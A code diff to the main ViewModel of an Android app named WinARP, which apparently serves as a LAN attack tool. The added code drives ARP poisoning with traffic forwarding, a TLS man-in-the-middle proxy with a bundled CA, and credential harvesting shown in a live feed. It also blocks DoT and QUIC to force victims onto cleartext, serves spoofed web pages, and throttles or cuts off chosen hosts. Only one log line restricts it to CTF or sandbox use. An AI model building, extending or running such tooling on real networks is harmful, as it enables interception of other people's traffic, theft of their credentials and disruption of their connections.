@@ -3,20 +3,44 @@ package com.winarp.mobile.ui
 import android.app.Application
 import androidx.lifecycle.AndroidViewModel
 import androidx.lifecycle.viewModelScope
+import com.winarp.mobile.data.Tab
+import com.winarp.mobile.data.CapturePeer
+import com.winarp.mobile.data.HostControl
 import com.winarp.mobile.data.HostInfo
 import com.winarp.mobile.data.IfaceInfo
 import com.winarp.mobile.data.RootState
+import com.winarp.mobile.data.SpoofConfig
+import com.winarp.mobile.data.SpoofMode
 import com.winarp.mobile.net.ArpPoisoner
+import com.winarp.mobile.net.CaptureEngine
 import com.winarp.mobile.net.IpUtils
 import com.winarp.mobile.net.LanScanner
 import com.winarp.mobile.net.NativeArp
 import com.winarp.mobile.net.NetworkRepository
+import com.winarp.mobile.net.OuiDb
 import com.winarp.mobile.net.RootHelper
+import com.winarp.mobile.net.RootNet
+import com.winarp.mobile.net.TlsMitm
+import com.winarp.mobile.net.WebServer
+import com.winarp.mobile.store.FileLogger
+import com.winarp.mobile.store.Prefs
+import com.winarp.mobile.store.Settings
+import java.io.File
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
 import kotlinx.coroutines.flow.asStateFlow
+import kotlinx.coroutines.flow.distinctUntilChanged
+import kotlinx.coroutines.flow.launchIn
+import kotlinx.coroutines.flow.map
+import kotlinx.coroutines.flow.onEach
+import android.os.SystemClock
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.Job
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.flow.update
+import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
@@ -35,10 +59,21 @@ data class MainUiState(
     val toIp: String = "",
     val resolveName: Boolean = true,
     val oneWay: Boolean = false,
+    val forwardMitm: Boolean = true,
+    val tab: Tab = Tab.Scan,
+    val showSettings: Boolean = false,
+    val showRaw: Boolean = false,
+    val forcePlaintext: Boolean = false,
+    val interceptHttps: Boolean = false,
+    val spoofConfig: SpoofConfig = SpoofConfig(),
+    val spoofHtml: String = WebServer.DEFAULT_PAGE,
+    val hostControls: Map<String, HostControl> = emptyMap(),
+    val editHostIp: String? = null,
+    val autoRestore: Boolean = true,
     val scanning: Boolean = false,
     val attacking: Boolean = false,
     val scanProgress: Pair<Int, Int>? = null,
-    val status: String = "界面已就绪",
+    val status: String = "Ready",
     val rootState: RootState = RootState.Unknown,
     val logs: List<String> = emptyList(),
     val nativeLoaded: Boolean = NativeArp.loaded
@@ -57,14 +92,78 @@ class MainViewModel(app: Application) : AndroidViewModel(app) {
 
     private val timeFmt = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
 
+    private val capture = CaptureEngine()
+    val capturePeers: StateFlow<List<CapturePeer>> = capture.peers
+    val captureRaw: StateFlow<List<String>> = capture.raw
+    val captureRunning: StateFlow<Boolean> = capture.running
+    val captureTarget: StateFlow<String?> = capture.target
+
+    private val web = WebServer()
+    val webRunning: StateFlow<Boolean> = web.running
+    val webRequests: StateFlow<Int> = web.requests
+    val webLog: StateFlow<List<String>> = web.log
+    private val spoofDir = File(getApplication<Application>().filesDir, "spoofsite")
+    private val singleFile = File(getApplication<Application>().filesDir, "spoof_single.html")
+
+    private val prefs = Prefs(app)
+    private val fileLog = FileLogger(app)
+    private val tls = TlsMitm()
+    private val tlsPort = 8443
+
+    private val _hostBps = MutableStateFlow(0.0)
+    val hostBps: StateFlow<Double> = _hostBps.asStateFlow()
+    private var meterJob: Job? = null
+
+    /** Decrypted HTTPS requests + harvested credentials, shown live on the Sniff tab. */
+    private val _intercept = MutableStateFlow<List<String>>(emptyList())
+    val intercept: StateFlow<List<String>> = _intercept.asStateFlow()
+
+    private fun pushIntercept(line: String) {
+        val ts = synchronized(timeFmt) { timeFmt.format(Date()) }
+        _intercept.update { (it + "$ts  $line").let { l -> if (l.size > 300) l.takeLast(300) else l } }
+    }
+
+    /** Sink for every line the local proxies emit: goes to the log AND the live intercept feed. */
+    private fun onProxyLine(line: String) {
+        appendLog(line)
+        if (line.startsWith("[TLS]") || line.startsWith("[CREDS]")) pushIntercept(line)
+    }
+
+    fun clearIntercept() {
+        _intercept.value = emptyList()
+    }
+
     init {
-        appendLog("WinARP Android - 局域网扫描 / 多线程 ARP 污染")
-        appendLog("提示: 扫描可无 Root；断网攻击需要 Root + AF_PACKET")
-        appendLog("仅用于 CTF / 授权沙箱")
+        // restore sticky settings from previous runs
+        val s = prefs.load()
+        _state.update {
+            it.copy(
+                workers = s.workers, intervalMs = s.intervalMs,
+                resolveName = s.resolveName, oneWay = s.oneWay, forwardMitm = s.forwardMitm,
+                cidr = s.cidr, gateway = s.gateway, targetSpec = s.targetSpec, fromIp = s.fromIp, toIp = s.toIp,
+                spoofHtml = s.spoofHtml.ifBlank { WebServer.DEFAULT_PAGE },
+                autoRestore = s.autoRestore,
+                spoofConfig = it.spoofConfig.copy(
+                    mode = runCatching { SpoofMode.valueOf(s.spoofModeName) }.getOrDefault(SpoofMode.SINGLE_PAGE),
+                    redirectUrl = s.redirectUrl, targetHosts = s.targetHosts,
+                    spaFallback = s.spaFallback, assistCaptivePortal = s.assistCaptivePortal,
+                    port = s.spoofPort.coerceIn(1024, 65535)
+                )
+            )
+        }
+        // auto-persist sticky settings on change (distinctUntilChanged ignores log/scan churn)
+        state.map { it.toSettings() }.distinctUntilChanged().onEach { prefs.save(it) }.launchIn(viewModelScope)
+
+        web.setCredSink { onProxyLine(it) }
+        appendLog("WinARP Android - LAN scan / multi-thread ARP poison")
+        appendLog("Tip: scanning works without root; disruption attack needs Root + AF_PACKET")
+        appendLog("For CTF / authorized sandbox only")
+        appendLog("[i] logs -> ${fileLog.path()}")
+        viewModelScope.launch { withContext(Dispatchers.IO) { OuiDb.ensureLoaded(app) } }
         if (!NativeArp.loaded) {
-            appendLog("[!] native 库加载失败: ${NativeArp.loadError}")
+            appendLog("[!] native library failed to load: ${NativeArp.loadError}")
         } else {
-            appendLog("[+] native 引擎已加载")
+            appendLog("[+] native engine loaded")
         }
         refreshIfaces()
         checkRoot()
@@ -82,20 +181,20 @@ class MainViewModel(app: Application) : AndroidViewModel(app) {
                         selectedIfaceIndex = if (list.isEmpty()) 0 else idx,
                         cidr = selected?.cidr ?: st.cidr,
                         gateway = selected?.gateway ?: st.gateway,
-                        status = if (list.isEmpty()) "未发现可用网卡，请连接 Wi-Fi" else "已加载 ${list.size} 个网卡"
+                        status = if (list.isEmpty()) "No usable NIC found, please connect Wi-Fi" else "Loaded ${list.size} NIC(s)"
                     )
                 }
                 if (list.isEmpty()) {
-                    appendLog("[-] 没有可用 IPv4 网卡")
+                    appendLog("[-] no usable IPv4 NIC")
                 } else {
-                    appendLog("[+] 网卡 ${list.size} 个")
+                    appendLog("[+] ${list.size} NIC(s)")
                     list.forEach {
                         appendLog("    ${it.name} ip=${it.ip} mac=${it.mac} gw=${it.gateway.ifBlank { "-" }}")
                     }
                 }
             } catch (t: Throwable) {
-                appendLog("[-] 网卡加载失败: ${t.message}")
-                _state.update { it.copy(status = "网卡加载失败") }
+                appendLog("[-] NIC load failed: ${t.message}")
+                _state.update { it.copy(status = "NIC load failed") }
             }
         }
     }
@@ -105,9 +204,9 @@ class MainViewModel(app: Application) : AndroidViewModel(app) {
             val rs = RootHelper.checkRoot()
             _state.update { it.copy(rootState = rs) }
             when (rs) {
-                RootState.Available -> appendLog("[+] Root 可用")
-                RootState.Denied -> appendLog("[!] 检测到 su 但未授权 Root")
-                RootState.Missing -> appendLog("[!] 未检测到 Root 环境（攻击功能不可用）")
+                RootState.Available -> appendLog("[+] Root available")
+                RootState.Denied -> appendLog("[!] su detected but root not authorized")
+                RootState.Missing -> appendLog("[!] no root environment detected (attack unavailable)")
                 RootState.Unknown -> Unit
             }
         }
@@ -133,6 +232,7 @@ class MainViewModel(app: Application) : AndroidViewModel(app) {
     fun updateToIp(v: String) = _state.update { it.copy(toIp = v.trim()) }
     fun updateResolveName(v: Boolean) = _state.update { it.copy(resolveName = v) }
     fun updateOneWay(v: Boolean) = _state.update { it.copy(oneWay = v) }
+    fun updateForwardMitm(v: Boolean) = _state.update { it.copy(forwardMitm = v) }
 
     fun toggleHost(ip: String) {
         _state.update { st ->
@@ -157,7 +257,7 @@ class MainViewModel(app: Application) : AndroidViewModel(app) {
         if (st.scanning || st.attacking) return
         val iface = st.selectedIface
         if (iface == null) {
-            appendLog("[-] 请先选择网卡")
+            appendLog("[-] select a NIC first")
             return
         }
         val workers = st.workers.toIntOrNull() ?: 64
@@ -166,13 +266,13 @@ class MainViewModel(app: Application) : AndroidViewModel(app) {
         _state.update {
             it.copy(
                 scanning = true,
-                status = "正在扫描 $cidr ...",
+                status = "Scanning $cidr ...",
                 scanProgress = 0 to 0,
                 hosts = emptyList(),
                 selectedHostIps = emptySet()
             )
         }
-        appendLog("[*] 开始扫描 $cidr workers=$workers")
+        appendLog("[*] start scan $cidr workers=$workers")
 
         viewModelScope.launch {
             try {
@@ -185,7 +285,7 @@ class MainViewModel(app: Application) : AndroidViewModel(app) {
                     _state.update { cur ->
                         cur.copy(
                             scanProgress = done to total,
-                            status = "扫描中 $done/$total"
+                            status = "Scanning $done/$total"
                         )
                     }
                 }
@@ -194,20 +294,20 @@ class MainViewModel(app: Application) : AndroidViewModel(app) {
                         hosts = hosts,
                         scanning = false,
                         scanProgress = null,
-                        status = "扫描完成，发现 ${hosts.size} 台设备",
+                        status = "Scan complete, ${hosts.size} device(s) found",
                         selectedHostIps = emptySet()
                     )
                 }
-                appendLog("[+] 扫描完成: ${hosts.size} hosts")
+                appendLog("[+] scan complete: ${hosts.size} hosts")
                 hosts.take(30).forEach { h ->
                     appendLog("    ${h.ip}  ${h.mac}  ${h.name}")
                 }
                 if (hosts.size > 30) appendLog("    ... ${hosts.size - 30} more")
             } catch (t: Throwable) {
                 _state.update {
-                    it.copy(scanning = false, scanProgress = null, status = "扫描失败")
+                    it.copy(scanning = false, scanProgress = null, status = "Scan failed")
                 }
-                appendLog("[-] 扫描失败: ${t.message}")
+                appendLog("[-] Scan failed: ${t.message}")
             }
         }
     }
@@ -216,8 +316,8 @@ class MainViewModel(app: Application) : AndroidViewModel(app) {
         val st = _state.value
         val ips = st.hosts.filter { it.ip in st.selectedHostIps }.map { it.ip }
         if (ips.isEmpty()) {
-            appendLog("[-] 请先在列表中选择目标")
-            _state.update { it.copy(status = "未选择目标") }
+            appendLog("[-] select targets from the list first")
+            _state.update { it.copy(status = "No targets selected") }
             return
         }
         startAttack(ips, "selected")
@@ -227,8 +327,8 @@ class MainViewModel(app: Application) : AndroidViewModel(app) {
         val st = _state.value
         val ips = IpUtils.collectTargets(st.targetSpec, st.fromIp, st.toIp)
         if (ips.isEmpty()) {
-            appendLog("[-] 目标 IP/段 为空或无效")
-            _state.update { it.copy(status = "目标无效") }
+            appendLog("[-] target IP/range empty or invalid")
+            _state.update { it.copy(status = "Invalid target") }
             return
         }
         startAttack(ips, "range")
@@ -239,20 +339,20 @@ class MainViewModel(app: Application) : AndroidViewModel(app) {
         if (st.attacking || st.scanning) return
         val iface = st.selectedIface
         if (iface == null) {
-            appendLog("[-] 无网卡")
+            appendLog("[-] no NIC")
             return
         }
         val gateway = st.gateway.ifBlank { iface.gateway }
         if (!IpUtils.isValidIpv4(gateway)) {
-            appendLog("[-] 网关无效")
-            _state.update { it.copy(status = "网关无效") }
+            appendLog("[-] Invalid gateway")
+            _state.update { it.copy(status = "Invalid gateway") }
             return
         }
         val workers = st.workers.toIntOrNull() ?: 32
         val interval = st.intervalMs.toIntOrNull() ?: 1000
 
-        _state.update { it.copy(attacking = true, status = "正在解析目标...") }
-        appendLog("[*] 启动攻击 tag=$tag targets=${targets.size} workers=$workers")
+        _state.update { it.copy(attacking = true, status = "Resolving targets...") }
+        appendLog("[*] launch attack tag=$tag targets=${targets.size} workers=$workers")
 
         viewModelScope.launch {
             try {
@@ -265,19 +365,19 @@ class MainViewModel(app: Application) : AndroidViewModel(app) {
                     log = { appendLog(it) }
                 )
                 if (poisonTargets.isEmpty()) {
-                    _state.update { it.copy(attacking = false, status = "没有可达目标") }
+                    _state.update { it.copy(attacking = false, status = "No reachable targets") }
                     appendLog("[-] no reachable targets")
                     return@launch
                 }
 
                 val gwMac = resolveGatewayMac(iface, gateway)
                 if (gwMac == null) {
-                    _state.update { it.copy(attacking = false, status = "网关 MAC 解析失败") }
+                    _state.update { it.copy(attacking = false, status = "Gateway MAC resolution failed") }
                     appendLog("[-] gateway MAC $gateway not found")
                     return@launch
                 }
 
-                _state.update { it.copy(status = "污染中 · ${poisonTargets.size} 目标") }
+                _state.update { it.copy(status = "Poisoning · ${poisonTargets.size} targets") }
                 poisoner.start(
                     iface = iface,
                     targets = poisonTargets,
@@ -285,29 +385,37 @@ class MainViewModel(app: Application) : AndroidViewModel(app) {
                     gatewayMac = gwMac,
                     intervalMs = interval,
                     oneWay = st.oneWay,
+                    mitm = st.forwardMitm,
                     log = { appendLog(it) },
                     onStopped = {
                         _state.update { cur ->
-                            cur.copy(attacking = false, status = "已停止")
+                            cur.copy(attacking = false, status = "Stopped")
                         }
                     }
                 )
             } catch (t: Throwable) {
-                _state.update { it.copy(attacking = false, status = "攻击失败") }
+                _state.update { it.copy(attacking = false, status = "Attack failed") }
                 appendLog("[-] ${t.message}")
             }
         }
     }
 
     fun stopAttack() {
+        val iface = _state.value.selectedIface
+        val hadControls = _state.value.hostControls.isNotEmpty()
         viewModelScope.launch {
-            _state.update { it.copy(status = "正在停止...") }
+            _state.update { it.copy(status = "Stopping...") }
             poisoner.stop { appendLog(it) }
-            _state.update { it.copy(attacking = false, status = "已停止") }
+            // limits/blocks/proxy only make sense while attacking — clear them so nothing lingers
+            if (hadControls && iface != null) {
+                RootNet.clearControls(iface.name)
+                appendLog("[+] host limits cleared")
+            }
+            _state.update { it.copy(attacking = false, status = "Stopped", hostControls = emptyMap()) }
         }
     }
 
-    private fun resolveGatewayMac(iface: IfaceInfo, gateway: String): String? {
+    private suspend fun resolveGatewayMac(iface: IfaceInfo, gateway: String): String? {
         val table = repo.readProcArp()[gateway]
         if (!table.isNullOrBlank() && !IpUtils.isZeroMac(table)) return table
         if (NativeArp.loaded) {
@@ -321,8 +429,321 @@ class MainViewModel(app: Application) : AndroidViewModel(app) {
         return repo.readProcArp()[gateway]?.takeIf { !IpUtils.isZeroMac(it) }
     }
 
+    fun selectTab(t: Tab) = _state.update { it.copy(tab = t) }
+    fun openSettings() = _state.update { it.copy(showSettings = true) }
+    fun closeSettings() = _state.update { it.copy(showSettings = false) }
+
+    fun logFilePath(): String = fileLog.path()
+
+    /** Undo every root-level network change we may have made (professional 'panic'/reset). */
+    /** Copy the MITM CA to a shareable file so the user can install it on devices they own. */
+    fun exportCaFile(): String? {
+        return try {
+            val a = getApplication<Application>()
+            val dir = (a.getExternalFilesDir("certs") ?: File(a.filesDir, "certs")).apply { mkdirs() }
+            val out = File(dir, "winarp_mitm_ca.pem")
+            a.assets.open("mitm_ca.pem").use { input -> out.outputStream().use { input.copyTo(it) } }
+            out.absolutePath
+        } catch (_: Throwable) {
+            null
+        }
+    }
+
+    fun restoreNetwork() {
+        val iface = _state.value.selectedIface
+        capture.stop()
+        web.stop()
+        tls.stop()
+        _state.update { it.copy(hostControls = emptyMap(), forcePlaintext = false, showRaw = false, interceptHttps = false) }
+        if (iface != null) {
+            viewModelScope.launch {
+                RootNet.clearControls(iface.name)
+                RootNet.forcePlaintext(iface.name, false)
+                RootNet.disableHttpRedirect(iface.name, _state.value.spoofConfig.port)
+                RootNet.disableHttpsRedirect(iface.name, tlsPort)
+                RootNet.disableForwarding(iface.name)
+            }
+        }
+        appendLog("[+] network restored — all root changes reverted")
+    }
+
+    /** Block DoT (853) + QUIC (UDP/443) so victims fall back to cleartext DNS/TLS (domains appear). */
+    fun toggleForcePlaintext() {
+        val iface = _state.value.selectedIface ?: return
+        val on = !_state.value.forcePlaintext
+        _state.update { it.copy(forcePlaintext = on) }
+        viewModelScope.launch {
+            val err = RootNet.forcePlaintext(iface.name, on)
+            when {
+                err != null -> appendLog("[!] force plaintext: $err")
+                on -> appendLog("[+] force plaintext ON — blocked DoT(853) + QUIC(443)")
+                else -> appendLog("[+] force plaintext OFF")
+            }
+        }
+    }
+
+    /**
+     * Global HTTPS interception: REDIRECT every forwarded victim's :80/:443 into our local proxies
+     * and block QUIC/DoT so nothing slips past. One switch instead of per-host opt-in — this is why
+     * the earlier per-host flow looked like "nothing happened". Requires an active MITM attack to
+     * feed it; pinned apps (banking/FB/IG) still can't be decrypted and are reported as such.
+     */
+    fun toggleInterceptHttps() {
+        val iface = _state.value.selectedIface ?: run { appendLog("[-] select a NIC first"); return }
+        val on = !_state.value.interceptHttps
+        _state.update { it.copy(interceptHttps = on) }
+        val port = _state.value.spoofConfig.port
+        if (on) {
+            val we = ensureWebServer()
+            if (we != null) appendLog("[!] proxy server: $we")
+            if (!tls.running.value) {
+                val te = tls.start(getApplication<Application>(), tlsPort) { line -> onProxyLine(line) }
+                if (te != null) appendLog("[!] TLS proxy: $te")
+            }
+            _state.update { it.copy(forcePlaintext = true) }
+            viewModelScope.launch {
+                RootNet.enableHttpRedirect(iface.name, port)
+                RootNet.enableHttpsRedirect(iface.name, tlsPort)
+                RootNet.forcePlaintext(iface.name, true)
+                appendLog("[+] Decrypt HTTPS ON — :80→:$port, :443→:$tlsPort, QUIC/DoT blocked")
+                appendLog("[i] results appear on Sniff (Decrypted). Attack a host with Keep online (MITM) to feed it. Pinned apps (banking/FB/IG) won't decrypt — shown as 'pinned'.")
+            }
+        } else {
+            _state.update { it.copy(forcePlaintext = false) }
+            viewModelScope.launch {
+                RootNet.disableHttpsRedirect(iface.name, tlsPort)
+                RootNet.disableHttpRedirect(iface.name, port)
+                RootNet.forcePlaintext(iface.name, false)
+                appendLog("[+] Decrypt HTTPS OFF")
+            }
+            tls.stop()
+        }
+    }
+
+    /** Start/stop the capture from the sniffer screen. */
+    fun toggleCapture() {
+        if (capture.running.value) {
+            capture.stop()
+            return
+        }
+        val iface = _state.value.selectedIface ?: return
+        capture.start(viewModelScope, iface.name, iface.ip, iface.prefixLength)
+    }
+
+    fun clearCapture() = capture.clear()
+
+    // ---- Per-host traffic controls (bandwidth / latency / loss / block / proxy) ----
+
+    /** Best-first, honest interception plan for a host, from its vendor/name fingerprint. */
+    fun interceptPlanFor(ip: String): com.winarp.mobile.data.InterceptPlan {
+        val host = _state.value.hosts.firstOrNull { it.ip == ip }
+        val vendor = host?.mac?.let { OuiDb.vendor(it) }
+        return com.winarp.mobile.net.InterceptPlanner.plan(vendor, host?.name)
+    }
+
+    fun openHostControls(ip: String) {
+        _state.update { it.copy(editHostIp = ip) }
+        startMeter(ip)
+    }
+
+    fun closeHostControls() {
+        stopMeter()
+        _state.update { it.copy(editHostIp = null) }
+    }
+
+    /** Live REAL throughput (bits/s) of the host's forwarded traffic, polled from iptables counters. */
+    private fun startMeter(ip: String) {
+        val iface = _state.value.selectedIface ?: return
+        meterJob?.cancel()
+        _hostBps.value = 0.0
+        meterJob = viewModelScope.launch(Dispatchers.IO) {
+            RootNet.meterOn(iface.name, ip)
+            var prev = RootNet.readMeterBytes(ip)
+            var prevT = SystemClock.elapsedRealtime()
+            while (isActive) {
+                delay(1000)
+                val cur = RootNet.readMeterBytes(ip)
+                val now = SystemClock.elapsedRealtime()
+                val dt = (now - prevT) / 1000.0
+                if (dt > 0) _hostBps.value = (cur - prev).coerceAtLeast(0L) * 8.0 / dt
+                prev = cur; prevT = now
+            }
+        }
+    }
+
+    private fun stopMeter() {
+        meterJob?.cancel(); meterJob = null
+        _hostBps.value = 0.0
+        viewModelScope.launch { RootNet.meterOff() }
+    }
+
+    fun editHostControl(ip: String, edit: (HostControl) -> HostControl) {
+        _state.update { st ->
+            val next = edit(st.hostControls[ip] ?: HostControl())
+            val map = st.hostControls.toMutableMap()
+            if (next.active) map[ip] = next else map.remove(ip)
+            st.copy(hostControls = map)
+        }
+    }
+
+    fun applyHostControls() {
+        val iface = _state.value.selectedIface
+        if (iface == null) {
+            appendLog("[-] no NIC selected")
+            return
+        }
+        val map = _state.value.hostControls
+        // proxy needs the local servers up — start them automatically
+        if (map.values.any { it.proxied }) {
+            val e = ensureWebServer()
+            if (e == null) appendLog("[+] local proxy (:80) ready on :${_state.value.spoofConfig.port}")
+            else appendLog("[!] proxy server: $e")
+            if (!tls.running.value) {
+                val te = tls.start(getApplication<Application>(), tlsPort) { line -> onProxyLine(line) }
+                if (te == null) appendLog("[+] TLS MITM (:443) ready on :$tlsPort — decrypts non-validating/CA-trusting hosts")
+                else appendLog("[!] TLS proxy: $te")
+            }
+        }
+        // Limiting/blocking IS an attack: the host's traffic must transit this device. Start MITM on
+        // the controlled hosts so the shaping actually bites (this is why a cap did nothing before).
+        val targets = map.filterValues { it.active }.keys.toList()
+        if (targets.isNotEmpty() && !_state.value.attacking) {
+            _state.update { it.copy(forwardMitm = true) }
+            startAttack(targets, "limit")
+        }
+        viewModelScope.launch {
+            val err = RootNet.applyControls(iface.name, map, _state.value.spoofConfig.port, tlsPort)
+            if (err == null) appendLog("[+] traffic controls applied to ${map.size} host(s)")
+            else appendLog("[!] traffic controls: $err")
+        }
+    }
+
+    fun clearHostControls() {
+        val iface = _state.value.selectedIface
+        _state.update { it.copy(hostControls = emptyMap()) }
+        if (iface != null) {
+            viewModelScope.launch {
+                RootNet.clearControls(iface.name)
+                appendLog("[+] traffic controls cleared")
+            }
+        }
+    }
+
+    /** Raw packet feed is opt-in: not collected/rendered until the user asks for it. */
+    fun toggleRaw() {
+        val on = !_state.value.showRaw
+        _state.update { it.copy(showRaw = on) }
+        capture.setRawEnabled(on)
+    }
+
+    // ---- Page spoofing (configurable web server + :80 REDIRECT) ----
+
+    fun updateSpoofPort(v: Int) = _state.update { it.copy(spoofConfig = it.spoofConfig.copy(port = v.coerceIn(1024, 65535))) }
+    fun toggleAutoRestore() = _state.update { it.copy(autoRestore = !it.autoRestore) }
+    fun updateSpoofMode(m: SpoofMode) = _state.update { it.copy(spoofConfig = it.spoofConfig.copy(mode = m)) }
+    fun updateRedirectUrl(v: String) = _state.update { it.copy(spoofConfig = it.spoofConfig.copy(redirectUrl = v.trim())) }
+    fun updateTargetHosts(v: String) = _state.update { it.copy(spoofConfig = it.spoofConfig.copy(targetHosts = v)) }
+    fun updateSpoofHtml(v: String) = _state.update { it.copy(spoofHtml = v) }
+    fun toggleCaptive() = _state.update { it.copy(spoofConfig = it.spoofConfig.copy(assistCaptivePortal = !it.spoofConfig.assistCaptivePortal)) }
+    fun toggleSpa() = _state.update { it.copy(spoofConfig = it.spoofConfig.copy(spaFallback = !it.spoofConfig.spaFallback)) }
+
+    /** Absolute path of the document root, so users can push an imported site / Vite dist into it. */
+    fun spoofDocRootPath(): String = spoofDir.absolutePath
+
+    fun toggleSpoof() {
+        if (web.running.value) stopSpoof() else startSpoof()
+    }
+
+    /** Start the local web server (writing the seed page) if it isn't running. Returns error/null. */
+    private fun ensureWebServer(): String? {
+        if (web.running.value) return null
+        val st = _state.value
+        try {
+            singleFile.writeText(st.spoofHtml.ifBlank { WebServer.DEFAULT_PAGE })
+            if (!spoofDir.exists()) spoofDir.mkdirs()
+            val idx = File(spoofDir, "index.html")
+            if (!idx.exists()) idx.writeText(WebServer.DEFAULT_PAGE)
+        } catch (t: Throwable) {
+            appendLog("[!] spoof storage: ${t.message}")
+        }
+        return web.start(st.spoofConfig, spoofDir, singleFile)
+    }
+
+    private fun startSpoof() {
+        val iface = _state.value.selectedIface
+        if (iface == null) {
+            appendLog("[-] no NIC selected")
+            return
+        }
+        val err = ensureWebServer()
+        if (err != null) {
+            appendLog("[!] spoof server: $err")
+            return
+        }
+        val port = _state.value.spoofConfig.port
+        viewModelScope.launch {
+            val re = RootNet.enableHttpRedirect(iface.name, port)
+            if (re == null) {
+                appendLog("[+] spoof ON — HTTP :80 -> :$port (poison targets with MITM to feed it)")
+            } else {
+                appendLog("[!] http redirect: $re")
+            }
+        }
+    }
+
+    private fun stopSpoof() {
+        web.stop()
+        val iface = _state.value.selectedIface
+        val port = _state.value.spoofConfig.port
+        if (iface != null) viewModelScope.launch { RootNet.disableHttpRedirect(iface.name, port) }
+        appendLog("[*] spoof stopped")
+    }
+
+    /** Pick a single host to filter the sniff/attack: explicit From, else target spec, else a selected host. */
+    private fun firstTargetIp(): String? {
+        val st = _state.value
+        val candidate = st.fromIp.ifBlank {
+            st.targetSpec.split(',', ' ', '-', '\n', '\t', ';').firstOrNull { IpUtils.isValidIpv4(it.trim()) }?.trim()
+                ?: st.selectedHostIps.firstOrNull().orEmpty()
+        }
+        return candidate.takeIf { IpUtils.isValidIpv4(it) }
+    }
+
+    override fun onCleared() {
+        super.onCleared()
+        capture.stop()
+        web.stop()
+        tls.stop()
+        if (_state.value.autoRestore) {
+            _state.value.selectedIface?.let { RootNet.revertAllDetached(it.name, _state.value.spoofConfig.port) }
+        }
+    }
+
+    private fun MainUiState.toSettings() = Settings(
+        workers = workers,
+        intervalMs = intervalMs,
+        resolveName = resolveName,
+        oneWay = oneWay,
+        forwardMitm = forwardMitm,
+        cidr = cidr,
+        gateway = gateway,
+        targetSpec = targetSpec,
+        fromIp = fromIp,
+        toIp = toIp,
+        spoofModeName = spoofConfig.mode.name,
+        redirectUrl = spoofConfig.redirectUrl,
+        targetHosts = spoofConfig.targetHosts,
+        spaFallback = spoofConfig.spaFallback,
+        assistCaptivePortal = spoofConfig.assistCaptivePortal,
+        spoofHtml = spoofHtml,
+        spoofPort = spoofConfig.port,
+        autoRestore = autoRestore
+    )
+
     private fun appendLog(line: String) {
-        val stamped = "${timeFmt.format(Date())}  $line"
+        val ts = synchronized(timeFmt) { timeFmt.format(Date()) }
+        val stamped = "$ts  $line"
+        fileLog.append(stamped)
         _state.update { st ->
             val next = (st.logs + stamped).let { if (it.size > 500) it.takeLast(500) else it }
             st.copy(logs = next)
